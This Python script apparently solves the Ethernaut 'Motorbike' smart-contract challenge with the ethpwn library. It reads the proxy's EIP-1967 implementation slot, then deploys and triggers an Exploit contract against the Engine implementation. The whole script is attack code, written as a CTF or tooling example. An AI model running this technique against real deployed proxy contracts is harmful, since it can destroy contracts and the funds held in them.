#!/usr/bin/env python3

import os
from pathlib import Path
from time import sleep
from ethpwn import *

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

CUR_DIR = Path(__file__).resolve().parent

solidity_includes = CUR_DIR.joinpath('..', 'solidity-includes').resolve()

# demonstrates hwo to specify custom remappings when the default remappings don't discover them
compile_contracts([os.path.join(CUR_DIR, 'exploit.sol')], import_remappings={
    'openzeppelin-contracts-06': solidity_includes / 'openzeppelin-contracts-0.6/contracts',
    'openzeppelin-contracts-0.6': solidity_includes / 'openzeppelin-contracts-0.6/contracts',
})

bike = CONTRACT_METADATA['Motorbike'].get_contract_at(ARGS.proxy_addr)
IMPLEMENTATION_SLOT='0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
engine_addr = normalize_contract_address(context.w3.eth.get_storage_at(ARGS.proxy_addr, IMPLEMENTATION_SLOT))
engine = CONTRACT_METADATA['Engine'].get_contract_at(engine_addr)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr, engine.address) as (tx_hash, target):
    sleep(2)
    transact(target.functions.exploit(), force=True)
